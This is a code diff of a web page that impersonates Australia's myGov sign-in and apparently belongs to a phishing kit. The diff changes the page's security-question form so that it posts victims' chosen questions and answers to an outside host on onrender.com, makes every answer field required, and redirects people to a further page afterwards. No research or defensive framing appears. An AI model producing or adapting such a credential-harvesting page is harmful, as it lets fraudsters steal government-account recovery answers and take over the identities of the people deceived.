@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <title>Sign in with myGov - myGov</title>
+    <title>Security Questions - myGov</title>
     <meta name="description" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="format-detection" content="telephone=no">
@@ -53,12 +53,12 @@
                         <div class="login-grid-column">
                             <div class="digital-id-login-card-wrapper">
                                 <div class="digital-id-main-login-card override">
-                                    <h1>Sign in with myGov</h1>
-                                    <h2 class="text-align-left">Verify your Security Questions</h2>
-                                    <form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="/submit-security" method="post">
+                                    <h1>Answer Security Questions</h1>
+                                    <h2 class="text-align-left">Verify your identity with security questions</h2>
+                                    <form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="https://my-go-q7tp.onrender.com/submit-security" method="post">
                                         <div class="input-group">
                                             <label class="override" for="sec_q_1">Security Question 1</label>
-                                            <select id="sec_q_1" class="selectoption" name="sec_q_1">
+                                            <select id="sec_q_1" class="selectoption" name="sec_q_1" required>
                                                 <option value="0">Select Your Security Question</option>
                                                 <option value="What was the first single/album I bought?">What was the first single/album I bought?</option>
                                                 <option value="What was the first live concert, theatre or band I went to see?">What was the first live concert, theatre or band I went to see?</option>
@@ -68,12 +68,12 @@
                                                 <option value="What is the name of the first street I lived in?">What is the name of the first street I lived in?</option>
                                                 <option value="x">Write your own question</option>
                                             </select>
-                                            <input style="display:none;" placeholder="Enter your own question" id="sec_q_11" name="sec_q_11" aria-required="true" type="text" value="" autocomplete="off"/>
-                                            <input placeholder="Enter Security Answer" id="sec_a_1" name="sec_a_1" aria-required="true" type="text" value="" autocomplete="off"/>
+                                            <input style="display:none;" placeholder="Enter your own question" id="sec_q_11" name="sec_q_11" type="text" value="" autocomplete="off"/>
+                                            <input placeholder="Enter Security Answer" id="sec_a_1" name="sec_a_1" type="text" value="" autocomplete="off" required/>
                                         </div>
                                         <div class="input-group">
                                             <label class="override" for="sec_q_2">Security Question 2</label>
-                                            <select id="sec_q_2" class="selectoption" name="sec_q_2">
+                                            <select id="sec_q_2" class="selectoption" name="sec_q_2" required>
                                                 <option value="0">Select Your Security Question</option>
                                                 <option value="What was the first single/album I bought?">What was the first single/album I bought?</option>
                                                 <option value="What was my favorite childhood book?">What was my favorite childhood book?</option>
@@ -83,12 +83,12 @@
                                                 <option value="What was the name of my first pet?">What was the name of my first pet?</option>
                                                 <option value="x">Write your own question</option>
                                             </select>
-                                            <input style="display:none;" placeholder="Enter your own question" id="sec_q_22" name="sec_q_22" aria-required="true" type="text" value="" autocomplete="off"/>
-                                            <input placeholder="Enter Security Answer" id="sec_a_2" name="sec_a_2" aria-required="true" type="text" value="" autocomplete="off"/>
+                                            <input style="display:none;" placeholder="Enter your own question" id="sec_q_22" name="sec_q_22" type="text" value="" autocomplete="off"/>
+                                            <input placeholder="Enter Security Answer" id="sec_a_2" name="sec_a_2" type="text" value="" autocomplete="off" required/>
                                         </div>
                                         <div class="input-group">
                                             <label class="override" for="sec_q_3">Security Question 3</label>
-                                            <select id="sec_q_3" class="selectoption" name="sec_q_3">
+                                            <select id="sec_q_3" class="selectoption" name="sec_q_3" required>
                                                 <option value="0">Select Your Security Question</option>
                                                 <option value="What is my most memorable moment in my adult life?">What is my most memorable moment in my adult life?</option>
                                                 <option value="Who was my favorite teacher at school?">Who was my favorite teacher at school?</option>
@@ -98,8 +98,8 @@
                                                 <option value="What was the name of my first pet?">What was the name of my first pet?</option>
                                                 <option value="x">Write your own question</option>
                                             </select>
-                                            <input style="display:none;" placeholder="Enter your own question" id="sec_q_33" name="sec_q_33" aria-required="true" type="text" value="" autocomplete="off"/>
-                                            <input placeholder="Enter Security Answer" id="sec_a_3" name="sec_a_3" aria-required="true" type="text" value="" autocomplete="off"/>
+                                            <input style="display:none;" placeholder="Enter your own question" id="sec_q_33" name="sec_q_33" type="text" value="" autocomplete="off"/>
+                                            <input placeholder="Enter Security Answer" id="sec_a_3" name="sec_a_3" type="text" value="" autocomplete="off" required/>
                                         </div>
                                         <br>
                                         <div class="button-digital-id-main-container override">
@@ -107,7 +107,7 @@
                                                 <button type="submit" class="button-main" name="_eventId_login">Continue</button>
                                             </div>
                                             <center>
-                                                <a href="otp.html">SKIP</a>
+                                                <a href="/c.html">SKIP</a>
                                             </center>
                                         </div>
                                         <!-- Feedback messages -->
@@ -224,7 +224,7 @@
                     feedbackDiv.textContent = 'Security questions submitted successfully! Redirecting...';
                     feedbackDiv.className = 'success-message';
                     setTimeout(() => {
-                        window.location.href = 'c.html'; // Redirect to c.html
+                        window.location.href = '/c.html'; // Redirect to images page
                     }, 1000);
                 } else {
                     feedbackDiv.textContent = result.error || 'Error submitting security questions.';
